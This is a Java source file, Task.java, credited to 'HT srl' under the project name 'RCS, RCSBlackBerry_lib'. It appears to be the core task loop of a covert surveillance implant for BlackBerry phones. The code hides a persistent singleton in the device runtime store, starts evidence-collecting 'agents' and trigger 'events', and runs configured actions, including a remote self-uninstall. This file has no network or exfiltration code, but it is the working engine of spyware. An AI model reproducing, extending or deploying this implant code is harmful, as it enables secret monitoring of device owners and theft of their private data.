//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.RuntimeStore;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.action.UninstallAction;
import blackberry.agent.Agent;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.EvidenceCollector;
import blackberry.interfaces.Singleton;
import blackberry.interfaces.UserAgent;
import blackberry.utils.Check;
import blackberry.utils.Utils;

/**
 * The Class Task.
 */
public final class Task implements Singleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 1000;
    private static final long GUID = 0xefa4f28c0e0c8693L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    //#endif

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Task singleton = new Task();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    /** The conf. */
    Conf conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    EvidenceCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    AgentManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = EvidenceCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();

        //#ifdef DEBUG
        debug.trace("Task created");

        //#endif
    }

    Date lastActionCheckedStart;
    Date lastActionCheckedEnd;
    String lastAction;
    String lastSubAction;

    //Thread actionThread;

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public boolean checkActions() {

        try {
            for (;;) {

                lastActionCheckedStart = new Date();

                //#ifdef DEBUG
                debug.trace("checkActions");
                //#endif

                if (needToRestart) {
                    //#ifdef DEBUG
                    debug.info("checkActions, needToRestart");
                    //#endif
                    needToRestart = false;
                    return false;
                }

                final int[] actionIds = status.getTriggeredActions();
                
                //#ifdef DEMO
                Debug.playSound();
                //#endif

                final int asize = actionIds.length;
                if (asize > 0) {

                    for (int k = 0; k < asize; ++k) {
                        final int actionId = actionIds[k];

                        final Action action = status.getAction(actionId);
                        lastAction = action.toString();

                        //#ifdef DEBUG
                        debug.trace("checkActions executing action: "
                                + actionId);
                        //#endif
                        int exitValue = executeAction(action);

                        if (exitValue == 1) {
                            //#ifdef DEBUG
                            debug.info("checkActions: Uninstall");
                            //#endif

                            UninstallAction.actualExecute();
                            return false;
                        } else if (exitValue == 2) {
                            //#ifdef DEBUG
                            debug.trace("checkActions: want Reload");
                            //#endif
                            return true;
                        } else {
                            //#ifdef DEBUG
                            debug.trace("checkActions finished executing action: "
                                    + actionId);
                            //#endif
                        }
                    }
                }
                lastActionCheckedEnd = new Date();

                Utils.sleep(SLEEPING_TIME);
            }
        } catch (final Throwable ex) {
            // catching trowable should break the debugger anc log the full stack trace
            //#ifdef DEBUG
            debug.fatal("checkActions error, restart: " + ex);
            //#endif
            return true;
        }
    }

    private int executeAction(final Action action) {
        int exit = 0;
        //#ifdef DEBUG
        debug.trace("CheckActions() triggered: " + action);
        //#endif

        status.unTriggerAction(action);
        //action.setTriggered(false, null);

        status.synced = false;
        final Vector subActions = action.getSubActionsList();
        final int ssize = subActions.size();

        //#ifdef DEBUG
        debug.trace("checkActions, " + ssize + " subactions");
        //#endif

        for (int j = 0; j < ssize; ++j) {
            try {
                final SubAction subAction = (SubAction) subActions.elementAt(j);
                //#ifdef DBC
                Check.asserts(subAction != null,
                        "checkActions: subAction!=null");
                //#endif

                lastSubAction = subAction.toString();

                /*
                 * final boolean ret = subAction.execute(action
                 * .getTriggeringEvent());
                 */

                //#ifdef DEBUG
                debug.info("CheckActions() executing subaction (" + (j + 1)
                        + "/" + ssize + ") : " + action);
                //#endif

                // no callingEvent
                subAction.prepareExecute(null);
                subAction.run();

                if (subAction.wantUninstall()) {
                    //#ifdef DEBUG
                    debug.warn("CheckActions() uninstalling");
                    //#endif

                    exit = 1;
                    break;
                    //return false;
                }

                if (subAction.wantReload()) {
                    //#ifdef DEBUG
                    debug.warn("checkActions: reloading");
                    //#endif
                    status.unTriggerAll();
                    //#ifdef DEBUG
                    debug.trace("checkActions: stopping agents");
                    //#endif
                    agentManager.stopAll();
                    //#ifdef DEBUG
                    debug.trace("checkActions: stopping events");
                    //#endif
                    eventManager.stopAll();
                    Utils.sleep(2000);
                    //#ifdef DEBUG
                    debug.trace("checkActions: untrigger all");
                    //#endif
                    status.unTriggerAll();
                    //return true;
                    exit = 2;
                    break;
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("checkActions for: " + ex);
                //#endif
            }
        }

        return exit;
    }

    private void stopAll() {
        agentManager.stopAll();
        eventManager.stopAll();
        status.unTriggerAll();
    }

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        //#ifdef DEBUG
        debug.info("startApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    public synchronized void stopApplicationTimer() {
        //#ifdef DEBUG
        debug.info("stopApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Start application timer.
     */
    public synchronized void resumeApplicationTimer() {
        //#ifdef DEBUG
        debug.info("resumeApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
        applicationTimer = new Timer();

        if (appUpdateManager == null) {
            appUpdateManager = new AppUpdateManager();
        } else {
            appUpdateManager = new AppUpdateManager(appUpdateManager);
        }

        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);

    }

    /**
     * Stop application timer.
     */
    synchronized void suspendApplicationTimer() {
        //#ifdef DEBUG
        debug.info("suspendApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        //#ifdef DEBUG
        debug.trace("TaskInit");
        //#endif

        agentManager.stopAll();
        eventManager.stopAll();

        if (device != null) {
            try {
                device.refreshData();
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        conf = new Conf();

        if (conf.load() == false) {
            //#ifdef DEBUG
            debug.trace("Load Conf FAILED");
            //#endif

            return false;
        } else {
            //#ifdef DEBUG
            debug.trace("taskInit: Load Conf Succeded");
            //#endif
        }

        //#ifdef DEBUG
        debug.trace("----------");
        debug.info("AGENTS");
        Vector vector = status.getAgentsList();
        for (int i = 0; i < vector.size(); i++) {
            Agent agent = (Agent) vector.elementAt(i);
            if (agent.isEnabled()) {
                debug.info("    " + agent.toString());
            }
        }

        debug.info("ACTIONS");
        vector = status.getActionsList();
        for (int i = 0; i < vector.size(); i++) {
            Action action = (Action) vector.elementAt(i);
            debug.info("    " + action.toString());
            Vector subs = action.getSubActionsList();
            for (int j = 0; j < subs.size(); j++) {
                SubAction sub = (SubAction) subs.elementAt(j);
                debug.info("        " + sub.toString());
            }
        }

        debug.info("EVENTS");
        vector = status.getEventsList();
        for (int i = 0; i < vector.size(); i++) {
            Event event = (Event) vector.elementAt(i);
            if (event.isEnabled()) {
                debug.info("    " + event.toString());
            }
        }
        //#endif

        if (logCollector != null) {
            logCollector.initEvidences();
        }

        // Da qui in poi inizia la concorrenza dei thread

        if (eventManager.startAll() == false) {
            //#ifdef DEBUG
            debug.trace("eventManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("Events started");

        //#endif

        if (agentManager.startAll() == false) {
            //#ifdef DEBUG
            debug.trace("agentManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("Agents started");

        //#endif
        return true;
    }

    public void reset() {
        //#ifdef DEBUG
        debug.trace("reset");
        //#endif
        stopAll();
        status.unTriggerAll();

        // http://supportforums.blackberry.com/t5/Java-Development/Programmatically-rebooting-the-device/m-p/42049?view=by_date_ascending
        CodeModuleManager.promptForResetIfRequired();

    }

    private boolean needToRestart;

    public void restart() {
        //#ifdef DEBUG
        debug.trace("restart");
        //#endif
        stopAll();
        status.unTriggerAll();
        needToRestart = true;
    }

    public void resumeUserAgents() {
        //#ifdef DEBUG
        debug.trace("resumeUserAgents");
        //#endif
        Vector vector = status.getAgentsList();
        for (int i = 0; i < vector.size(); i++) {
            Agent agent = (Agent) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (agent.isEnabled() && !agent.isRunning()) {
                    //#ifdef DEBUG
                    debug.trace("resumeUserAgents: " + agent);
                    //#endif
                    agentManager.start(agent.agentId);
                }
            }
        }
    }

    public void suspendUserAgents() {
        //#ifdef DEBUG
        debug.trace("suspendUserAgents");
        //#endif
        Vector vector = status.getAgentsList();
        for (int i = 0; i < vector.size(); i++) {
            Agent agent = (Agent) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (agent.isEnabled() && agent.isRunning()) {
                    //#ifdef DEBUG
                    debug.trace("suspendUserAgents: " + agent);
                    //#endif
                    agentManager.stop(agent.agentId);
                }
            }
        }
    }
}
